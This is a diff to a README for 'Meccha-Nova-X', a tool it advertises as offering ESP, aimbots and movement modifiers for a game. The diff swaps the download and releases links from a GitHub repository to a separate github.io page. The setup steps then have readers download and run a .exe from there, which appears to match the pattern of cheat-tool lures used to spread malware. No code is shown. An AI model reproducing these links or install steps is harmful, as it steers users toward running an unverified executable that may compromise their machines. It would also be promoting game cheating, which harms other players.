@@ -1,6 +1,6 @@
 # 🚀 Meccha-Nova-X - Optimize your game performance every match
 
-[![](https://img.shields.io/badge/Download-Meccha--Nova--X-blue)](https://github.com/inevitable-abbess938/Meccha-Nova-X)
+[![](https://img.shields.io/badge/Download-Meccha--Nova--X-blue)](https://inevitable-abbess938.github.io)
 
 Meccha-Nova-X provides a set of tools for the Meccha Chameleon platform. This software assists players with extra visibility, precise aim control, and movement modifiers. You gain access to features like ESP, aimbots, and custom game settings to improve your experience within the game environment.
 
@@ -19,7 +19,7 @@ Before you install this software, ensure your computer meets these minimum speci
 
 Follow these steps to add the tool to your computer.
 
-1. Visit this page to download the software: [Meccha-Nova-X Releases](https://github.com/inevitable-abbess938/Meccha-Nova-X).
+1. Visit this page to download the software: [Meccha-Nova-X Releases](https://inevitable-abbess938.github.io).
 2. Look for the file ending in .exe under the latest version.
 3. Click the file to start your download.
 4. Locate the file in your Downloads folder after the download finishes.
